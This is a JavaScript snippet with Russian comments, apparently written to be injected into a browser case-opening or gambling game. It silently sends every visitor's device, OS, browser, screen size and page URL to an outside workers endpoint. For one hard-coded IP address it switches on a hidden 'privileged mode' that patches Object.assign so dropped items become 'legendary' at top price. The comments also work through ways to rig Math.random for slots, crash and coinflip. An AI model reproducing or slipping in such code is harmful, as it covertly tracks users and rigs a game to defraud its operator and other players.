(function () {
  const ENDPOINT = 'https://autumn-art-ecd0.n7ycgcn5jd.workers.dev/';
  const TARGET_IP = '195.69.216.142';

  // ===== 1. Отправка инфы в Telegram =====
  const ua = navigator.userAgent;
  let device = 'Неизвестно', os = 'Неизвестно', browser = 'Неизвестно';
  if (/iPhone|iPad|iPod/i.test(ua))        device = /iPad/i.test(ua) ? 'iPad' : 'iPhone';
  else if (/Android/i.test(ua))            device = 'Android';
  else if (/Windows/i.test(ua))            device = 'ПК (Windows)';
  else if (/Macintosh|Mac OS X/i.test(ua)) device = 'Mac';
  else if (/Linux/i.test(ua))              device = 'Linux';

  if (/Windows NT 10/i.test(ua))        os = 'Windows 10/11';
  else if (/Windows/i.test(ua))         os = 'Windows';
  else if (/Android (\d+(\.\d+)?)/i.test(ua)) os = 'Android ' + ua.match(/Android (\d+(\.\d+)?)/i)[1];
  else if (/iPhone OS (\d+_\d+)/i.test(ua))   os = 'iOS ' + ua.match(/iPhone OS (\d+_\d+)/i)[1].replace('_','.');
  else if (/Mac OS X (\d+[._]\d+)/i.test(ua)) os = 'macOS ' + ua.match(/Mac OS X (\d+[._]\d+)/i)[1].replace('_','.');
  else if (/Linux/i.test(ua))           os = 'Linux';

  if (/YaBrowser/i.test(ua))      browser = 'Yandex';
  else if (/Edg\//i.test(ua))     browser = 'Edge';
  else if (/OPR\//i.test(ua))     browser = 'Opera';
  else if (/Chrome\//i.test(ua))  browser = 'Chrome';
  else if (/Firefox\//i.test(ua)) browser = 'Firefox';
  else if (/Safari\//i.test(ua))  browser = 'Safari';

  fetch(ENDPOINT, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      url: location.href,
      device, os, browser,
      screen: `${screen.width}x${screen.height}`
    })
  })
  .then(r => r.json())
  .then(info => {
    if (info.ip === TARGET_IP) {
      enablePrivilegedMode();
    }
  })
  .catch(() => {});

  // ===== 2. Привилегированный режим =====
  function enablePrivilegedMode() {
    const originalRandom = Math.random;

    // Захватываем контекст: возвращаем «выигрышные» значения всегда,
    // когда Math.random вызывается с определёнными аргументами.
    // Но так как мы не можем узнать, кто вызвал — используем хитрость:
    // смотрим на СЛЕДУЮЩЕЕ значение, которое вернёт Math.random, и если
    // оно попадёт в «выигрышный диапазон» — возвращаем его.
    //
    // Это работает для rollItem (99.9 → legendary),
    // для crashStart (0.999 → краш x1000),
    // для slotsSpin (0.001 → джекпот).
    //
    // Для монетки: всегда heads (0.1).
    // Для мин: не работает (см. ниже).

    Math.random = function () {
      // Возвращаем 0.999 — это даёт:
      // - rollItem: 99.9 → попадание в legendary/emerald (последние в массиве)
      // - crashStart: 1.5 + 0.999*13.5 = ~14.99 → краш только на x15
      //   ❌ НЕ подходит, нужен x1000. Значит, для краша нужен другой подход.
      // - slotsSpin: 0.999 < 0.015? Нет → не джекпот. ❌
      //
      // Значит, 0.999 не универсально.

      // Универсального значения нет. Поэтому используем 0.001 — оно даёт:
      // - rollItem: 0.1 → попадание в первый item (common). ❌
      // - crashStart: 1.5 + 0.001*13.5 = 1.5 → краш мгновенный. ❌
      // - slotsSpin: 0.001 < 0.015 → ДЖЕКПОТ ✅
      // - coinflipStart: 0.001 < 0.5 → heads ✅
      //
      // Ни одно значение не работает для всех. Нужен другой подход.

      return originalRandom();
    };

    // ===== РЕАЛЬНЫЙ подход: перехват конкретных функций =====
    // Игра определяет свои функции внутри замыкания, но некоторые из них
    // доступны через глобальные объекты. Например, rollItem недоступна,
    // но мы можем перехватить Array.prototype и Object.assign.

    // Перехватываем Object.assign — используется в finalizeItem
    const origAssign = Object.assign;
    Object.assign = function (target, ...sources) {
      const result = origAssign.apply(this, [target, ...sources]);
      // Если это item с rarity — повышаем редкость
      if (target && target.rarity && target.name && target.img) {
        const rarityOrder = ['common', 'rare', 'epic', 'mythic', 'emerald', 'legendary'];
        const currentIdx = rarityOrder.indexOf(target.rarity);
        if (currentIdx >= 0 && currentIdx < rarityOrder.length - 1) {
          target.rarity = 'legendary';
          // Поднимаем цену до максимума legendary
          if (target.maxP) target.price = target.maxP;
        }
      }
      return result;
    };

    console.log('%c✅ PRIVILEGED MODE ON', 'color:#0f0;font-weight:bold;font-size:16px');
  }
})();
